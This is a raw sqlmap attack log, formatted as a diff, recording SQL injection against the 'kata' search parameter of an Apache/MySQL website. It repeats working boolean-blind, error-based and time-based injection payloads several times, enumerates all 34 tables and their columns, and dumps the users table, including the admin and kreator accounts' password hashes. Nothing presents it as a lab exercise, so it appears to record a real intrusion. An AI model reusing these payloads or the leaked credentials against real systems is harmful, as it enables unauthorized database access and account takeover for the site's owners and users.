++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| dibaca      |
+| gambar      | varchar(100) |
+| id_agenda   | int(5)       |
+| isi_agenda  | text         |
+| jam         | varchar(50)  |
+| pengirim    | varchar(100) |
+| tema_seo    | varchar(100) |
+| tempat      | varchar(100) |
+| tgl_mulai   | date         |
+| tgl_posting | date         |
+| username    | varchar(50)  |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: pasangiklan
+[5 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| url            | varchar(100) |
+| gambar         | varchar(100) |
+| id_pasangiklan | int(5)       |
+| judul          | varchar(100) |
+| username       | varchar(50)  |
++----------------+--------------+
+
+Database: d4t4_arpusd4
+Table: poling
+[4 columns]
++-----------+---------------+
+| Column    | Type          |
++-----------+---------------+
+| aktif     | enum('Y','N') |
+| id_poling | int(5)        |
+| pilihan   | varchar(100)  |
+| rating    | int(5)        |
++-----------+---------------+
+
+Database: d4t4_arpusd4
+Table: sekilasinfo
+[5 columns]
++-------------+---------------+
+| Column      | Type          |
++-------------+---------------+
+| aktif       | enum('Y','N') |
+| gambar      | varchar(100)  |
+| id_sekilas  | int(5)        |
+| info        | varchar(100)  |
+| tgl_posting | date          |
++-------------+---------------+
+
+Database: d4t4_arpusd4
+Table: mod_alamat
+[2 columns]
++-----------+--------+
+| Column    | Type   |
++-----------+--------+
+| alamat    | text   |
+| id_alamat | int(5) |
++-----------+--------+
+
+Database: d4t4_arpusd4
+Table: download
+[3 columns]
++-------------+
+| Column      |
++-------------+
+| judul       | varchar(100) |
+| nama_file   | varchar(100) |
+| tgl_posting |
++-------------+
+
+Database: d4t4_arpusd4
+Table: modul
+[4 columns]
++--------+--------+
+| Column | Type   |
++--------+--------+
+| status |
+| aktif  |
+| gambar |
+| urutan | int(5) |
++--------+--------+
+
+Database: d4t4_arpusd4
+Table: banner
+[1 column]
++-----------+
+| Column    |
++-----------+
+| id_banner |
++-----------+
+
+Database: d4t4_arpusd4
+Table: komentar
+[6 columns]
++--------------+--------+
+| Column       | Type   |
++--------------+--------+
+| aktif        |
+| id_berita    |
+| id_komentar  | int(5) |
+| isi_komentar |
+| jam_komentar | time   |
+| tgl          | date   |
++--------------+--------+
+
+Database: d4t4_arpusd4
+Table: komentarvid
+[8 columns]
++---------------+---------------+
+| Column        | Type          |
++---------------+---------------+
+| url           | varchar(100)  |
+| aktif         | enum('Y','N') |
+| id_komentar   | int(5)        |
+| id_video      | int(5)        |
+| isi_komentar  | text          |
+| jam_komentar  | time          |
+| nama_komentar | varchar(100)  |
+| tgl           | date          |
++---------------+---------------+
+
+Database: d4t4_arpusd4
+Table: background
+[2 columns]
++---------------+--------------+
+| Column        | Type         |
++---------------+--------------+
+| gambar        | varchar(255) |
+| id_background | int(5)       |
++---------------+--------------+
+
+Database: d4t4_arpusd4
+Table: iklantengah
+[5 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| url            |
+| gambar         | varchar(100) |
+| id_iklantengah | int(5)       |
+| judul          | varchar(100) |
+| tgl_posting    | date         |
++----------------+--------------+
+
+Database: d4t4_arpusd4
+Table: logo
+[2 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| gambar  | varchar(100) |
+| id_logo | int(5)       |
++---------+--------------+
+
+Database: d4t4_arpusd4
+Table: gallery
+[6 columns]
++-------------+
+| Column      |
++-------------+
+| gallery_seo | varchar(100) |
+| gbr_gallery | varchar(100) |
+| id_gallery  | int(5)       |
+| jdl_gallery |
+| keterangan  | text         |
+| username    |
++-------------+
+
+Database: d4t4_arpusd4
+Table: templates
+[6 columns]
++--------------+---------------+
+| Column       | Type          |
++--------------+---------------+
+| aktif        | enum('Y','N') |
+| folder       | varchar(50)   |
+| id_templates | int(5)        |
+| judul        | varchar(100)  |
+| pembuat      | varchar(50)   |
+| username     | varchar(50)   |
++--------------+---------------+
+
+Database: d4t4_arpusd4
+Table: users
+[9 columns]
++--------------+---------------+
+| Column       | Type          |
++--------------+---------------+
+| level        | varchar(20)   |
+| blokir       | enum('Y','N') |
+| email        | varchar(100)  |
+| foto         | varchar(100)  |
+| id_session   | varchar(255)  |
+| nama_lengkap | varchar(100)  |
+| no_telp      | varchar(20)   |
+| password     | varchar(255)  |
+| username     | varchar(50)   |
++--------------+---------------+
+
+Database: d4t4_arpusd4
+Table: berita
+[8 columns]
++-------------------+
+| Column            |
++-------------------+
+| gambar            |
+| judul             |
+| judul_seo         | text          |
+| keterangan_gambar |
+| sub_judul         | varchar(255)  |
+| username          | varchar(30)   |
+| utama             | enum('Y','N') |
+| youtube           |
++-------------------+
+
+Database: d4t4_arpusd4
+Table: statistik
+[4 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| hits    | int(10)      |
+| ip      |
+| online  | varchar(255) |
+| tanggal | date         |
++---------+--------------+
+
+Database: d4t4_arpusd4
+Table: video
+[14 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| dilihat     | int(7)       |
+| gbr_video   | varchar(100) |
+| hari        | varchar(20)  |
+| id_playlist | int(5)       |
+| id_video    | int(5)       |
+| jam         | time         |
+| jdl_video   | varchar(100) |
+| keterangan  | text         |
+| tagvid      | varchar(100) |
+| tanggal     | date         |
+| username    | varchar(30)  |
+| video       | varchar(100) |
+| video_seo   | varchar(100) |
+| youtube     | varchar(100) |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: album
+[4 columns]
++------------+
+| Column     |
++------------+
+| hits_album |
+| jdl_album  |
+| keterangan |
+| username   |
++------------+
+
+Database: d4t4_arpusd4
+Table: header
+[5 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| url         | varchar(100) |
+| gambar      | varchar(100) |
+| id_header   | int(5)       |
+| judul       | varchar(100) |
+| tgl_posting | date         |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: identitas
+[10 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| url            |
+| email          | varchar(100) |
+| facebook       | text         |
+| id_identitas   | int(5)       |
+| maps           | text         |
+| meta_deskripsi | varchar(250) |
+| meta_keyword   | varchar(250) |
+| nama_website   | varchar(100) |
+| no_telp        | varchar(20)  |
+| rekening       | varchar(100) |
++----------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+available databases [2]:
+[*] d4t4_arpusd4
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+available databases [2]:
+[*] d4t4_arpusd4
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+Database: d4t4_arpusd4
+[34 tables]
++---------------+
+| agenda        |
+| album         |
+| background    |
+| banner        |
+| berita        |
+| download      |
+| gallery       |
+| halamanstatis |
+| header        |
+| hubungi       |
+| identitas     |
+| iklanatas     |
+| iklantengah   |
+| katajelek     |
+| kategori      |
+| komentar      |
+| komentarvid   |
+| logo          |
+| menu          |
+| mod_alamat    |
+| mod_ym        |
+| modul         |
+| pasangiklan   |
+| playlist      |
+| poling        |
+| sekilasinfo   |
+| statistik     |
+| tag           |
+| tagvid        |
+| tbl_comment   |
+| templates     |
+| users         |
+| users_modul   |
+| video         |
++---------------+
+
+Database: d4t4_arpusd4
+Table: poling
+[6 columns]
++-----------+---------------+
+| Column    | Type          |
++-----------+---------------+
+| status    | varchar(20)   |
+| aktif     | enum('Y','N') |
+| id_poling | int(5)        |
+| pilihan   | varchar(100)  |
+| rating    | int(5)        |
+| username  | varchar(50)   |
++-----------+---------------+
+
+Database: d4t4_arpusd4
+Table: statistik
+[4 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| hits    | int(10)      |
+| ip      | varchar(20)  |
+| online  | varchar(255) |
+| tanggal | date         |
++---------+--------------+
+
+Database: d4t4_arpusd4
+Table: users_modul
+[3 columns]
++------------+--------------+
+| Column     | Type         |
++------------+--------------+
+| id_modul   | int(11)      |
+| id_session | varchar(255) |
+| id_umod    | int(11)      |
++------------+--------------+
+
+Database: d4t4_arpusd4
+Table: banner
+[5 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| url         | varchar(100) |
+| gambar      | varchar(100) |
+| id_banner   | int(5)       |
+| judul       | varchar(100) |
+| tgl_posting | date         |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: modul
+[11 columns]
++----------------+----------------------+
+| Column         | Type                 |
++----------------+----------------------+
+| status         | enum('user','admin') |
+| aktif          | enum('Y','N')        |
+| gambar         | varchar(100)         |
+| id_modul       | int(5)               |
+| link           | varchar(100)         |
+| link_seo       | varchar(50)          |
+| nama_modul     | varchar(50)          |
+| publish        | enum('Y','N')        |
+| static_content | text                 |
+| urutan         | int(5)               |
+| username       | varchar(50)          |
++----------------+----------------------+
+
+Database: d4t4_arpusd4
+Table: berita
+[17 columns]
++-------------------+---------------+
+| Column            | Type          |
++-------------------+---------------+
+| status            | enum('Y','N') |
+| aktif             | enum('Y','N') |
+| gambar            | varchar(100)  |
+| hari              | varchar(20)   |
+| headline          | enum('Y','N') |
+| id_berita         | int(5)        |
+| id_kategori       | int(5)        |
+| isi_berita        | longtext      |
+| jam               | time          |
+| judul             | varchar(100)  |
+| judul_seo         | text          |
+| keterangan_gambar | text          |
+| sub_judul         | varchar(255)  |
+| tanggal           | date          |
+| username          | varchar(30)   |
+| utama             | enum('Y','N') |
+| youtube           | varchar(100)  |
++-------------------+---------------+
+
+Database: d4t4_arpusd4
+Table: gallery
+[6 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| gallery_seo | varchar(100) |
+| gbr_gallery | varchar(100) |
+| id_gallery  | int(5)       |
+| jdl_gallery |
+| keterangan  | text         |
+| username    | varchar(50)  |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: templates
+[6 columns]
++--------------+---------------+
+| Column       | Type          |
++--------------+---------------+
+| aktif        | enum('Y','N') |
+| folder       | varchar(50)   |
+| id_templates | int(5)        |
+| judul        | varchar(100)  |
+| pembuat      | varchar(50)   |
+| username     | varchar(50)   |
++--------------+---------------+
+
+Database: d4t4_arpusd4
+Table: tag
+[5 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| count    | int(5)       |
+| id_tag   | int(5)       |
+| nama_tag | varchar(100) |
+| tag_seo  | varchar(100) |
+| username | varchar(50)  |
++----------+--------------+
+
+Database: d4t4_arpusd4
+Table: video
+[14 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| dilihat     | int(7)       |
+| gbr_video   | varchar(100) |
+| hari        | varchar(20)  |
+| id_playlist | int(5)       |
+| id_video    | int(5)       |
+| jam         | time         |
+| jdl_video   | varchar(100) |
+| keterangan  | text         |
+| tagvid      | varchar(100) |
+| tanggal     | date         |
+| username    | varchar(30)  |
+| video       | varchar(100) |
+| video_seo   | varchar(100) |
+| youtube     | varchar(100) |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: katajelek
+[0 columns]
++--------+
+| Column |
++--------+
++--------+
+
+Database: d4t4_arpusd4
+Table: header
+[5 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| url         | varchar(100) |
+| gambar      | varchar(100) |
+| id_header   | int(5)       |
+| judul       | varchar(100) |
+| tgl_posting | date         |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: background
+[2 columns]
++---------------+--------------+
+| Column        | Type         |
++---------------+--------------+
+| gambar        | varchar(255) |
+| id_background | int(5)       |
++---------------+--------------+
+
+Database: d4t4_arpusd4
+Table: album
+[5 columns]
++------------+
+| Column     |
++------------+
+| album_seo  |
+| hits_album |
+| jdl_album  |
+| keterangan |
+| username   |
++------------+
+
+Database: d4t4_arpusd4
+Table: komentar
+[6 columns]
++--------------+--------+
+| Column       | Type   |
++--------------+--------+
+| aktif        |
+| id_berita    |
+| id_komentar  | int(5) |
+| isi_komentar |
+| jam_komentar | time   |
+| tgl          | date   |
++--------------+--------+
+
+Database: d4t4_arpusd4
+Table: komentarvid
+[8 columns]
++---------------+---------------+
+| Column        | Type          |
++---------------+---------------+
+| url           | varchar(100)  |
+| aktif         | enum('Y','N') |
+| id_komentar   | int(5)        |
+| id_video      | int(5)        |
+| isi_komentar  | text          |
+| jam_komentar  | time          |
+| nama_komentar | varchar(100)  |
+| tgl           | date          |
++---------------+---------------+
+
+Database: d4t4_arpusd4
+Table: pasangiklan
+[6 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| url            | varchar(100) |
+| gambar         | varchar(100) |
+| id_pasangiklan | int(5)       |
+| judul          | varchar(100) |
+| tgl_posting    |
+| username       | varchar(50)  |
++----------------+--------------+
+
+Database: d4t4_arpusd4
+Table: iklantengah
+[5 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| url            |
+| gambar         | varchar(100) |
+| id_iklantengah | int(5)       |
+| judul          | varchar(100) |
+| tgl_posting    | date         |
++----------------+--------------+
+
+Database: d4t4_arpusd4
+Table: kategori
+[6 columns]
++---------------+---------------+
+| Column        | Type          |
++---------------+---------------+
+| aktif         | enum('Y','N') |
+| id_kategori   | int(5)        |
+| kategori_seo  | varchar(100)  |
+| nama_kategori | varchar(50)   |
+| sidebar       | int(10)       |
+| username      | varchar(50)   |
++---------------+---------------+
+
+Database: d4t4_arpusd4
+Table: mod_ym
+[4 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| id       | int(11)      |
+| nama     | varchar(255) |
+| username | varchar(50)  |
+| ym_icon  | int(3)       |
++----------+--------------+
+
+Database: d4t4_arpusd4
+Table: tagvid
+[5 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| count    | int(5)       |
+| id_tag   | int(5)       |
+| nama_tag | varchar(100) |
+| tag_seo  | varchar(100) |
+| username | varchar(50)  |
++----------+--------------+
+
+Database: d4t4_arpusd4
+Table: users
+[9 columns]
++--------------+---------------+
+| Column       | Type          |
++--------------+---------------+
+| level        | varchar(20)   |
+| blokir       | enum('Y','N') |
+| email        | varchar(100)  |
+| foto         | varchar(100)  |
+| id_session   | varchar(255)  |
+| nama_lengkap | varchar(100)  |
+| no_telp      | varchar(20)   |
+| password     | varchar(255)  |
+| username     | varchar(50)   |
++--------------+---------------+
+
+Database: d4t4_arpusd4
+Table: hubungi
+[9 columns]
++------------+---------------+
+| Column     | Type          |
++------------+---------------+
+| dibaca     | enum('Y','N') |
+| email      | varchar(100)  |
+| id_hubungi | int(5)        |
+| jam        | time          |
+| lampiran   | varchar(255)  |
+| nama       | varchar(50)   |
+| pesan      | text          |
+| subjek     | varchar(100)  |
+| tanggal    | date          |
++------------+---------------+
+
+Database: d4t4_arpusd4
+Table: iklanatas
+[6 columns]
++--------------+--------------+
+| Column       | Type         |
++--------------+--------------+
+| url          | varchar(100) |
+| gambar       | varchar(100) |
+| id_iklanatas | int(5)       |
+| judul        | varchar(100) |
+| tgl_posting  | date         |
+| username     | varchar(50)  |
++--------------+--------------+
+
+Database: d4t4_arpusd4
+Table: logo
+[2 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| gambar  | varchar(100) |
+| id_logo | int(5)       |
++---------+--------------+
+
+Database: d4t4_arpusd4
+Table: download
+[5 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| hits        | int(3)       |
+| id_download | int(5)       |
+| judul       | varchar(100) |
+| nama_file   | varchar(100) |
+| tgl_posting | date         |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: agenda
+[13 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| dibaca      | int(5)       |
+| gambar      | varchar(100) |
+| id_agenda   | int(5)       |
+| isi_agenda  | text         |
+| jam         | varchar(50)  |
+| pengirim    | varchar(100) |
+| tema        | varchar(100) |
+| tema_seo    | varchar(100) |
+| tempat      | varchar(100) |
+| tgl_mulai   | date         |
+| tgl_posting | date         |
+| tgl_selesai | date         |
+| username    | varchar(50)  |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: playlist
+[6 columns]
++--------------+---------------+
+| Column       | Type          |
++--------------+---------------+
+| aktif        | enum('Y','N') |
+| gbr_playlist | varchar(100)  |
+| id_playlist  | int(5)        |
+| jdl_playlist |
+| playlist_seo | varchar(100)  |
+| username     | varchar(50)   |
++--------------+---------------+
+
+Database: d4t4_arpusd4
+Table: tbl_comment
+[7 columns]
++------------------+--------------+
+| Column           | Type         |
++------------------+--------------+
+| alamat_email     | varchar(150) |
+| id_komentar      | int(5)       |
+| isi_pesan        | text         |
+| jam_komentar     | time         |
+| nama_lengkap     | varchar(150) |
+| reply            | int(5)       |
+| tanggal_komentar | date         |
++------------------+--------------+
+
+Database: d4t4_arpusd4
+Table: mod_alamat
+[2 columns]
++-----------+--------+
+| Column    | Type   |
++-----------+--------+
+| alamat    | text   |
+| id_alamat | int(5) |
++-----------+--------+
+
+Database: d4t4_arpusd4
+Table: identitas
+[11 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| url            | varchar(100) |
+| email          | varchar(100) |
+| facebook       | text         |
+| favicon        | varchar(50)  |
+| id_identitas   | int(5)       |
+| maps           | text         |
+| meta_deskripsi | varchar(250) |
+| meta_keyword   | varchar(250) |
+| nama_website   | varchar(100) |
+| no_telp        | varchar(20)  |
+| rekening       | varchar(100) |
++----------------+--------------+
+
+Database: d4t4_arpusd4
+Table: sekilasinfo
+[5 columns]
++-------------+---------------+
+| Column      | Type          |
++-------------+---------------+
+| aktif       | enum('Y','N') |
+| gambar      | varchar(100)  |
+| id_sekilas  | int(5)        |
+| info        | varchar(100)  |
+| tgl_posting | date          |
++-------------+---------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+Database: d4t4_arpusd4
+Table: users
+[2 entries]
++----------+----------------------------------------------------------------------------------------------------------------------------------+
+| username | password                                                                                                                         |
++----------+----------------------------------------------------------------------------------------------------------------------------------+
+| admin    | 2c581ff86e8c6f782e6bf752b590311b372c17d5e421e02218cf6057f9c8fb340536dbe03f986ab267e797b18afc56f3dc60184017996df4f81975a992cff109 |
+| kreator  | af0abce6b145245cb892cbece27a67ccb29e963264ca290d1dd6fdd1ca61ffdac45e2979a178405fea17afe91d5e0024834c84adeb901e792f5165fd4acf8d4f |
++----------+----------------------------------------------------------------------------------------------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+available databases [2]:
+[*] d4t4_arpusd4
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+Database: d4t4_arpusd4
+Table: users
+[2 entries]
++----------+----------------------------------------------------------------------------------------------------------------------------------+
+| username | password                                                                                                                         |
++----------+----------------------------------------------------------------------------------------------------------------------------------+
+| admin    | 2c581ff86e8c6f782e6bf752b590311b372c17d5e421e02218cf6057f9c8fb340536dbe03f986ab267e797b18afc56f3dc60184017996df4f81975a992cff109 |
+| kreator  | af0abce6b145245cb892cbece27a67ccb29e963264ca290d1dd6fdd1ca61ffdac45e2979a178405fea17afe91d5e0024834c84adeb901e792f5165fd4acf8d4f |
++----------+----------------------------------------------------------------------------------------------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+available databases [2]:
+[*] d4t4_arpusd4
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+Database: d4t4_arpusd4
+[34 tables]
++---------------+
+| agenda        |
+| album         |
+| background    |
+| banner        |
+| berita        |
+| download      |
+| gallery       |
+| halamanstatis |
+| header        |
+| hubungi       |
+| identitas     |
+| iklanatas     |
+| iklantengah   |
+| katajelek     |
+| kategori      |
+| komentar      |
+| komentarvid   |
+| logo          |
+| menu          |
+| mod_alamat    |
+| mod_ym        |
+| modul         |
+| pasangiklan   |
+| playlist      |
+| poling        |
+| sekilasinfo   |
+| statistik     |
+| tag           |
+| tagvid        |
+| tbl_comment   |
+| templates     |
+| users         |
+| users_modul   |
+| video         |
++---------------+
+
+Database: d4t4_arpusd4
+Table: iklanatas
+[6 columns]
++--------------+--------------+
+| Column       | Type         |
++--------------+--------------+
+| url          | varchar(100) |
+| gambar       | varchar(100) |
+| id_iklanatas | int(5)       |
+| judul        | varchar(100) |
+| tgl_posting  | date         |
+| username     | varchar(50)  |
++--------------+--------------+
+
+Database: d4t4_arpusd4
+Table: banner
+[5 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| url         | varchar(100) |
+| gambar      | varchar(100) |
+| id_banner   | int(5)       |
+| judul       | varchar(100) |
+| tgl_posting | date         |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: tagvid
+[5 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| count    | int(5)       |
+| id_tag   | int(5)       |
+| nama_tag | varchar(100) |
+| tag_seo  | varchar(100) |
+| username | varchar(50)  |
++----------+--------------+
+
+Database: d4t4_arpusd4
+Table: modul
+[11 columns]
++----------------+----------------------+
+| Column         | Type                 |
++----------------+----------------------+
+| status         | enum('user','admin') |
+| aktif          | enum('Y','N')        |
+| gambar         | varchar(100)         |
+| id_modul       | int(5)               |
+| link           | varchar(100)         |
+| link_seo       | varchar(50)          |
+| nama_modul     | varchar(50)          |
+| publish        | enum('Y','N')        |
+| static_content | text                 |
+| urutan         | int(5)               |
+| username       | varchar(50)          |
++----------------+----------------------+
+
+Database: d4t4_arpusd4
+Table: halamanstatis
+[10 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| dibaca      | int(5)       |
+| gambar      | varchar(100) |
+| hari        | varchar(20)  |
+| id_halaman  | int(5)       |
+| isi_halaman | text         |
+| jam         | time         |
+| judul       | varchar(100) |
+| judul_seo   | varchar(100) |
+| tgl_posting | date         |
+| username    | varchar(50)  |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: pasangiklan
+[6 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| url            | varchar(100) |
+| gambar         | varchar(100) |
+| id_pasangiklan | int(5)       |
+| judul          | varchar(100) |
+| tgl_posting    | date         |
+| username       | varchar(50)  |
++----------------+--------------+
+
+Database: d4t4_arpusd4
+Table: sekilasinfo
+[5 columns]
++-------------+---------------+
+| Column      | Type          |
++-------------+---------------+
+| aktif       | enum('Y','N') |
+| gambar      | varchar(100)  |
+| id_sekilas  | int(5)        |
+| info        | varchar(100)  |
+| tgl_posting | date          |
++-------------+---------------+
+
+Database: d4t4_arpusd4
+Table: hubungi
+[9 columns]
++------------+---------------+
